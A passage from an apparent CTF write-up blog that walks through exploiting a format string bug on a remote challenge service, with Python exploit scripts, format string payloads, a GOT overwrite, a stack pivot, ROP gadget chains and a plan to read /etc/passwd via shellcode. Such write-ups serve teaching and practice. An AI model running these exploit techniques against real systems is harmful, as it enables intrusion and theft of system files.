</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] wrote {} to {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="o">+</span><span class="n">where</span><span class="o">/</span><span class="mi">8</span><span class="p">)),</span> <span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="o">+</span><span class="n">where</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">parameter_636_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;parameter 5 points to: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">parameter_636_addr</span><span class="p">)</span>
</span><span class='line'><span class="n">value_at_636</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;address pointed to by parameter 5 contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_636</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">value_at_scratch</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_scratch</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">format_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">value_at_636</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span><span class="p">)</span> <span class="o">-</span> <span class="n">parameter_636_addr</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch is parameter {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># grab strlen from the GOT entry</span>
</span><span class='line'><span class="n">strlen_addr</span> <span class="o">=</span> <span class="n">read_from_address</span><span class="p">(</span><span class="mh">0x601b00</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] strlen is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">strlen_addr</span><span class="p">))</span>
</span><span class='line'><span class="c"># from libc-2.13-38 -- NOT CORRECT</span>
</span><span class='line'><span class="n">libc_base</span> <span class="o">=</span> <span class="n">strlen_addr</span> <span class="o">-</span> <span class="mh">0x80b70</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] libc_base is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># we need to have three addresses on the stack which we can directly address</span>
</span><span class='line'><span class="c"># to use them in the format string vuln </span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601e20</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601e21</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601e22</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ok, now try to set three bytes in one go</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># should write out &quot;BAS&quot; in one go</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;</span><span class="si">%66c</span><span class="s">%{}$hhn</span><span class="si">%255c</span><span class="s">%{}$hhn</span><span class="si">%18c</span><span class="s">%{}$hhn</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">format_offset</span><span class="o">+</span><span class="mi">636</span><span class="p">,</span> <span class="n">format_offset</span><span class="o">+</span><span class="mi">637</span><span class="p">,</span> <span class="n">format_offset</span><span class="o">+</span><span class="mi">638</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read it back to check!</span>
</span><span class='line'><span class="n">check</span> <span class="o">=</span> <span class="n">read_from_address</span><span class="p">(</span><span class="mh">0x601e20</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">check</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>First, it writes out <code>0x601e20</code>, <code>0x601e21</code> and <code>0x601e22</code> on the stack. <code>0x601e20</code> is an unused memory address close the GOT entries. Then, the payload to actually write three bytes to those addresses looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="s">&quot;</span><span class="si">%66c</span><span class="s">%{}$hhn</span><span class="si">%255c</span><span class="s">%{}$hhn</span><span class="si">%18c</span><span class="s">%{}$hhn</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">format_offset</span><span class="o">+</span><span class="mi">636</span><span class="p">,</span> <span class="n">format_offset</span><span class="o">+</span><span class="mi">637</span><span class="p">,</span> <span class="n">format_offset</span><span class="o">+</span><span class="mi">638</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>What it does, is print 66 dummy bytes (0x42 == &lsquo;B&rsquo;) and then writes out the number of bytes written so far (<code>%hhn</code>) to a location that is pointed to by parameter 636. Then, it prints 255 dummy bytes, to make the write counter overflow. Writing out the next byte with <code>%hhn</code> will output 66+255 % 256 = 61, &lsquo;A&rsquo;). The next byte is written in the same way. This allows three bytes to be written at once, and will allow overwriting the GOT entry of strlen with the address of system!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python sploit7.py
</span><span class='line'>parameter <span class="m">5</span> points to:  0x7fff3ca480d8
</span><span class='line'>address pointed to by parameter <span class="m">5</span> contains:  0x7fff3ca49f01
</span><span class='line'>scratch contains:  0x601b
</span><span class='line'>scratch is parameter 1601
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> strlen is at 0x7f82b7326c40.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc_base is at 0x7f82b72a60d0.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601e20 to 1601
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601e21 to 1602
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601e22 to 1603
</span><span class='line'>
</span><span class='line'>0x534142
</span></code></pre></td></tr></table></div></figure>


<p>OK, so that worked! I plugged in the values for system, the GOT entry for strlen and crossed my fingers. I tried to spawn a shell, but alas, no output. The binary had crashed though, and I tried again, this time trying for outbound access to my vps with <code>wget</code>. However, I never saw a HTTP connection and the remote binary seemed to hang. The service did not come back up. Uh-oh.</p>

<h2>Reaching out</h2>

<p>I apologized to <a href="https://twitter.com/MrUn1k0d3r">Mr.Un1k0d3r</a> via Twitter and he seemed interested in my poc. He even offered me to send the binary so I could play with it locally; I jumped at this chance of course, and requested the libc as well. Furthermore, he informed me that the box was heavily firewalled for security reasons (it being part of a CTF and all) and that my shell would not be accessible at all&hellip;</p>

<p>&hellip;Challenge accepted! :)</p>

<p>So it&rsquo;s back to the drawing board. The <code>system()</code> trick would not work, as the binary was not being ran using <code>socat</code>. It handled all the connections itself. Spawning a shell would not connect stdin, stdout and stderr to the socket that the binary was using, effectively stopping me from interacting with the shell.</p>

<p>Instead, I figured I could achieve an interactive shell by first using a call to <code>dup2</code> to duplicate the socket file descriptor, to couple it to stdin and stdout. This was inspired by <a href="http://shell-storm.org/shellcode/files/shellcode-881.php">this shellcode</a>.</p>

<p>First things first, though, I needed a ROP chain to actually read in the shellcode and run it. The stack was not executable (NX took care of that), so I had find a way to call <code>mprotect</code> to mark a section <code>rwx</code> and then <code>read</code> in the shellcode.</p>

<p>I started working on the ROP chain before Mr. Un1k0d3r sent over the files. This was pretty hard, as I had to search for the gadgets in libc (the binary did not contain enough gadgets) by dumping it. I first uploaded my own libc to <a href="http://ropshell.com">ropshell</a>. Once I had found a gadget, I dumped from -0x100 to +0x100 relative to that address; this allowed me to find the gadgets I needed. Luckily, soon after, I obtained the libc and the binary from Mr.Un1k0d3r, which helped a lot. I ran it in a 64-bit Kali (based on Debian) and started building and debugging my ROP exploit. But hold on a second!</p>

<h2>Pivot the Stack</h2>

<p>This wasn&rsquo;t a buffer overflow where I had full control over the stack! The ROP chain was somewhere in <code>buf</code> and I needed to make <code>rsp</code> point to it. Only then, the ROP chain would kick off properly. I had to find a single gadget that did this in one go. I roughly knew the location of <code>buf</code> relative to <code>rsp</code> (approximately at <code>rsp+0xd8</code>, which I reverse-engineered from the disassembly of the dumped binary). Why <code>buf</code>? <code>buf</code> <strong>can</strong> contain null bytes, whereas <code>cleanBuffer</code> cannot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">strncpy</span><span class="p">(</span><span class="n">cleanBuffer</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>The strncpy takes care of that; any null byte it encounters will make it stop copying. Because we&rsquo;re on 64-bit, the gadget addresses will for sure contain null bytes. Instead, have a look at where <code>strlen</code> is used:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">cleanBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'><span class="c1">// dissambled:</span>
</span><span class='line'><span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x11f0</span><span class="p">]</span>
</span><span class='line'><span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>      <span class="c1">// rax and rdi now point to buf</span>
</span><span class='line'><span class="n">call</span> <span class="n">dword</span> <span class="mh">0x400b00</span> <span class="c1">// strlen</span>
</span></code></pre></td></tr></table></div></figure>


<p>This meant that I had multiple options to pivot <code>rsp</code> to <code>buf</code>, for instance with a <code>xchg rax, rsp</code> gadget. Upon finding no suitables ones, I had to go with stack lifting. I uploaded the libc which I got from Mr. Un1k0d3r to ropshell.com and starting looking for gadgets. What would I need?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">stack</span> <span class="n">lifting</span>
</span><span class='line'><span class="n">syscall</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rax</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rdi</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rsi</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rdx</span>
</span></code></pre></td></tr></table></div></figure>


<p>See, I needed quite a few gadgets to be able to call <code>mprotect</code> and <code>read</code>. First, the stack lifting: I settled on <code>0x00082cfe: add rsp, 0x100; ret</code> in libc. I had no idea if I would have the correct amount added to <code>rsp</code>, but I solved that the lazy way by adding the ROP equivalent of a NOP-sled:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x041cf9</span><span class="o">:</span> <span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>This will keeping returning until the ROP chain hits the next correct gadget! I put everything together and tested it locally&hellip; but no dice! I debugged it in <code>gdb-peda</code> and the <code>mprotect</code> syscall seemed to work. The shellcode, however, was not being read in properly. The socket file descriptor was the problem. It was not a predictable value, so I could not hardcode it. I found that the socket was stored on the stack, but I could not leak it via the format string vulnerability. It was located at <code>rbp-0x48</code>, so I had to adjust my ROP chain to grab this value and use it in the <code>read</code> syscall. I had to build another ROP chain to get at it&hellip;</p>

<h2>Grabbing the socket descriptor value</h2>

<p>I started looking for gadgets that allowed me to dereference <code>rbp</code>. I ended up with these ones:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x0002028a</span> <span class="o">:</span> <span class="n">pop</span> <span class="n">r15</span><span class="p">;</span> <span class="n">ret</span>
</span><span class='line'><span class="mh">0x0006933f</span> <span class="o">:</span> <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">+</span> <span class="n">r15</span><span class="p">];</span> <span class="n">pop</span> <span class="n">rbp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r12</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r13</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r14</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r15</span><span class="p">;</span> <span class="n">ret</span>
</span><span class='line'><span class="mh">0x000eb938</span> <span class="o">:</span> <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span><span class="p">];</span> <span class="n">ret</span>
</span><span class='line'><span class="mh">0x0002c10e</span> <span class="o">:</span> <span class="n">xchg</span> <span class="n">eax</span><span class="p">,</span> <span class="n">edi</span><span class="p">;</span> <span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>The process is simple. The first <code>pop r15</code> will pop <code>-0x48</code> from the stack. Then, the address <code>rbp+r15</code> (effectively pointing to <code>rbp-0x48</code>) is loaded into <code>rax</code>. The value at this address is taken into <code>rax</code> in the third gadget. Finally, the value is stored in <code>edi</code>, ready for use in the <code>read</code> syscall. Here, I assume that the socket descriptor is less than 32 bits, which I think is reasonable. The <code>read</code> part of the ROP chain will read in the shellcode that we send and return to it.</p>

<p>I started with a modified read /etc/passwd shellcode, the <a href="http://shell-storm.org/shellcode/files/shellcode-878.php">original</a> of which was made by Mr.Un1k0d3r :)</p>

<h2>Putting it all together</h2>

<p>So from a high level, I use the format string vulnerability to write out the addresses of the first three bytes of the GOT entry of <code>strlen</code> to the stack. Then, using those addresses, the first three bytes of strlen&rsquo;s GOT entry are overwritten. The GOT entry of strlen then points to the stack lifting gadget. Upon connecting again, I send the ROP chain, the stack lifting gadget will be called instead of strlen, setting <code>rsp</code> to <code>buf</code>. The ROP chain kicks off and will grab the socket descriptor value, call <code>mprotect</code> and <code>read</code> in a shellcode. The shellcode will also use the socket descriptor and write the contents of <code>/etc/passwd</code> to the socket. All I have to do now is to sit back :)</p>

<p>Without further ado:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_directly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$lx</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">addr</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_indirectly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$s</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># ugly workaround, only grab 8 bytes. will fix this later!</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">,</span> <span class="n">address</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write_byte_value_via</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$hhn</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
